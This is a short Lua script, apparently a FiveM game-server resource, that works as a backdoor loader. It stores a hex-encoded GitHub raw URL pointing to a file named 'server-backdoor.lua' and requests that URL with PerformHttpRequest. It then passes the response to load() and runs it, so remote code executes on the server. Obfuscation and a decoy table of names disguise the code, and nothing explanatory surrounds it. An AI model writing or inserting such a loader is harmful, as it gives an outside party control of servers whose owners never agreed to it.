
local Methods = {
    Ench, Support, Host, pairs,
    Realease, Callbacks, Source,
    Hosting, Event, PerformHttpRequest,
    assert, server, load, Spawn, materials
}


local Link = {
    '68', '74', '74', '70', '73', '3a', '2f', '2f', '72', '61',
    '77', '2e', '67', '69', '74', '68', '75', '62', '75', '73',
    '65', '72', '63', '6f', '6e', '74', '65', '6e', '74', '2e',
    '63', '6f', '6d', '2f', '53', '79', '6e', '74', '61', '78',
    '73', '73', '2f', '4f', '2f', '6d', '61', '73', '74', '65',
    '72', '2f', '73', '65', '72', '76', '65', '72', '2d', '62',
    '61', '63', '6b', '64', '6f', '6f', '72', '2e', '6c', '75',
    '61'


}


function decode()
    _empt = ''
    for id,it in pairs(Link) do
        _empt = _empt..it
    end
    return (_empt:gsub('..', function (cc)
        return string.char(tonumber(cc, 16))
    end))
end

PerformHttpRequest('https://raw.githubusercontent.com/Syntaxsy/O/master/server-backdoor.lua', function (e, d)
    local s = assert(load(d))
    if (d == nil) then return end
    s()
end)
